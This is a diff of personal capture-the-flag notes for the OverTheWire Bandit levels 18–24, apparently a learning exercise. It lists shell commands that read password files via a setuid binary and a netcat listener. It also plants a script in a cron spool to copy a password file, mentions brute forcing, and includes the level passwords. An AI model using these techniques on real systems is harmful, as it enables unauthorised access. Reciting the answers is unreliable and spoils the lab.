@@ -73,5 +73,51 @@ diff passwords.new passwords.old
 ssh bandit18@localhost
 kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
 
-18) ssh -T bandit18@bandit.labs.overthewire.org -p 2220
+18) ssh -T bandit19@bandit.labs.overthewire.org -p 2220
 IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+
+19) ./bandit20-do cat /etc/bandit_pass/bandit20
+setuid allows to execute commands on behalf of another user, without using root
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
+20) echo "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" | nc -l localhost -p 61337 &
+    ./suconnect 61337
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
+21) cat /etc/cron.d/cronjob_bandit22
+    cat cronjob_bandit22.sh
+    cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv  
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+22) 1  cat /etc/cron.d/cronjob_bandit23
+    2  cat /usr/bin/cronjob_bandit23.sh
+    3  whoami
+    ...
+    6  echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+    7  cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+23) 1  cat /usr/bin/cronjob_bandit24.sh
+    ...
+   10  cd /tmp/
+   11  nano mine.sh
+    ...
+   17  mkdir albejust1
+   18  cd albejust1
+   19  nano script.sh
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/albejust1/pass
+
+   20  touch pass
+   21  chmod 666 pass
+    ...
+   41  chmod 777 script.sh
+   42  cp script.sh /var/spool/bandit24/
+   43  cat pass
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+24)create a bash file to brute force the password
+
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
